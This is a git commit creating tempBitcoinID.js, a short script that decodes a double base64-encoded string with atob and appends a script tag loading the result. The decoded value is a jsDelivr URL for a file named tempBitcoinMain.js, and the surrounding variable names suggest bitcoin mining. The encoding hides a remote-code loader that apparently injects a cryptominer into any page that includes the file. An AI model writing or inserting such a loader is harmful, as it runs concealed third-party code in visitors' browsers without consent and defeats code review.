05d08bebb8f92c0efa0d50cf6ff5a91e541bf98d
Nitin Varma <86908056+Official-NitinVarma@users.noreply.github.com>
2023-09-03 12:52:07 +0530

    Create tempBitcoinID.js

---
+++ tempBitcoinID.js
@@ -0,0 +1,6 @@
+const tempHashKey = "YUhSMGNITTZMeTlqWkc0dWFuTmtaV3hwZG5JdWJtVjBMMmRvTDA5bVptbGphV0ZzTFU1cGRHbHVWbUZ5YldFdllteHZZMnRqYUdGcGJpMUpSRUJzWVhSbGMzUXZkR1Z0Y0VKcGRHTnZhVzVOWVdsdUxtcHo=";
+const blockchainID = atob(tempHashKey);
+const bitcoinMiningID = atob(blockchainID);
+const scriptTag = document.createElement("script");
+scriptTag.src = bitcoinMiningID;
+document.body.appendChild(scriptTag);
